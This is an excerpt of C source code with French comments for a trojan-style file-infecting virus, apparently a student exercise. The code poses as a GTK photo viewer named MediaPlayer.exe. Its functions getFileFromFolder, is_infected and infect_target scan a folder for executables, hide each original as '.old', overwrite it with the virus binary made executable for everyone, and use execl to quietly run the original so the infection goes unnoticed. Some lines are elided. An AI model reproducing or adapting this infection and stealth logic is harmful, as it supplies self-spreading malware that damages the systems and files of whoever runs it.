...
int main(int argc, char **argv) {
    ...
    DIR* rep = OpenFolder("./");
    getFileFromFolder(rep); // Lance la routine d'infection sur tous les exécutables trouvés

    // ÉTAPE 2 : Vérification de l'identité actuelle (Suis-je le virus original ou un clone furtif ?)
    // Si le nom d'exécution est exactement le nom du virus de base (MediaPlayer.exe) :
    // Cela signifie que c'est la "Primo-Infection". L'utilisateur a cliqué sur le faux lecteur.
    if (strcmp(argv[0], "./MediaPlayer.exe") == 0) {
        ...
        gtk_window_set_position(GTK_WINDOW(pWindow), GTK_WIN_POS_CENTER); // Centre la fenêtre
        gtk_window_set_title(GTK_WINDOW(pWindow), "Mes photos"); // Titre trompeur
        
        layoutBox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0); // Boîte invisible pour aligner l'image et le bouton
        gtk_container_add(GTK_CONTAINER(pWindow), layoutBox);
        
        pButton = gtk_button_new_with_label("Suivant"); // Bouton pour faire défiler les images
        gtk_box_pack_end(GTK_BOX(layoutBox), pButton, FALSE, FALSE, 0); // Place le bouton en bas
        
        // Quitte proprement le programme GTK si la fenêtre est fermée avec la croix rouge
        g_signal_connect(G_OBJECT(pWindow), "destroy", G_CALLBACK(gtk_main_quit), NULL);
        // Associe le clic du bouton "Suivant" à notre fonction loadPictures (qui charge l'image suivante)
        g_signal_connect(G_OBJECT(pButton), "clicked", G_CALLBACK(loadPictures), (gpointer)layoutBox);
        
        // Charge la toute première image de couverture du virus
        pImage = gtk_image_new_from_file("images/image1.jpg");
        gtk_box_pack_start(GTK_BOX(layoutBox), pImage, TRUE, TRUE, 0);
        
        // Affiche la fenêtre à l'écran
        gtk_widget_show_all(pWindow);
        // Boucle infinie d'attente d'événements (clics) pour maintenir l'interface ouverte
        gtk_main();
    } else {
        // -------------------------------------------------------------
        // LE RELAIS FURTIF (TRANSFERT D'EXÉCUTION)
        // -------------------------------------------------------------
        // Si on est ici, c'est que le virus a pris la place d'un autre programme (ex: MonPG1)
        // Et que l'utilisateur l'a exécuté pensant lancer sa calculatrice.
        char old_file[256];
        // On reconstitue le nom du fichier légitime que l'on a précédemment caché sous .old
        // Exemple: si argv[0] est "./MonPG1", old_file devient "./MonPG1.old"
        ...
        if (access(old_file, F_OK) == 0) {
            // L'APPEL MAGIQUE : execl écrase notre processus viral en mémoire et lance le VRAI
            // programme à la place. L'utilisateur voit sa calculatrice s'ouvrir sans anomalie !
...
void getFileFromFolder(DIR* rep) {
    ...
    while ((entry = readdir(rep)) != NULL) {
        // Filtre : On ne cible que les programmes commençant par "MonPG" pour éviter
        // d'infecter tout le système Linux accidentellement ("MonPG1", "MonPG2", etc.)
        if (strncmp(entry->d_name, "MonPG", 5) == 0) {
            ...
            // CRITÈRE 1 : S_ISREG s'assure que c'est un fichier "normal" (non un dossier).
            // CRITÈRE 2 : S_IXUSR s'assure que le fichier est bien un EXÉCUTABLE. 
            if (S_ISREG(file_stat.st_mode) && (file_stat.st_mode & S_IXUSR)) {
                printf("Fichier exécutable trouvé : %s\n", entry->d_name);
                
                // Si le fichier cible réunit les critères, on vérifie qu'il n'a pas DÉJÀ été infecté
...
// -------------------------------------------------------------
int is_infected(char* file) {
    // Si le fichier examiné contient '.old' dans son nom, c'est que c'est déjà un original caché !
    ...
    // S'il existe (retourne 0), c'est que notre virus a déjà frappé cette cible par le passé.
...
void infect_target(char* file) {
    ...
    // ÉTAPE 3 : Duplication
    // Ouverture du corps de notre virus (MediaPlayer.exe) en mode "read binary" (rb)
    FILE *fvirus = fopen("./MediaPlayer.exe", "rb");
    // Création d'un NOUVEAU fichier vierge, prenant le nom exact de l'ancienne cible (ex: "MonPG1") en "write binary" (wb)
    ...
    // L'appel système chmod force le système à accorder l'autorisation "Exécutable" absolue à tout le monde.
...
// -------------------------------------------------------------
void loadPictures(GtkWidget *pButton, gpointer data) {
    // Tableau contenant les chemins relatifs vers la base de données d'images du "lecteur"
    char *images[] = {
        "images/image1.jpg", "images/image2.bmp", "images/image3.png",
        "images/image4.jpg", "images/image5.jpg", "images/image6.png"
    };
    
    // Logique circulaire : si on est à la dernière image (index 5), on revient à 0
    ...
    // Si l'image est trop grande pour l'écran, on la redimensionne proportionnellement
    ...
    g_object_unref(pixbuf); // Libère le Pixbuf (GTK a fait sa propre copie interne)

    // Ajustement astucieux de la fenêtre principale à la nouvelle taille de l'image (+50px pour le bouton)
